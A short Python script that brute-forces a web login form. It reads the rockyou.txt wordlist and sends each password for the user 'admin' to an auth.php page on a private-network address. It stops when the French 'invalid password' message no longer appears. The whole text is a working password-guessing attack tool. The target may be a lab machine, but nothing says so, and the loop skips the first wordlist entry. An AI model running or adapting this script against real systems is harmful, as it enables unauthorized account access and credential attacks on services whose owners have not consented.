
import requests

wordlist = 'C:\\Users\\MARCH\\Desktop\\rockyou.txt'
url = "http://192.168.1.81/auth.php?login=&pass="

with open(wordlist) as wl:
   line = wl.readline()
   cnt = 1
   while line:
       print("Line {}: {}".format(cnt, line.strip()))
       line = wl.readline()
       cnt += 1
       password = line.strip()
       http = requests.get(url, params={'login':'admin', 'pass':password, 'submit':'submit'})
       content = http.content


       if b'Mot de passe invalide' in content:
           print("Mauvais mot de passe", password)

       else:
           print(password)
           break
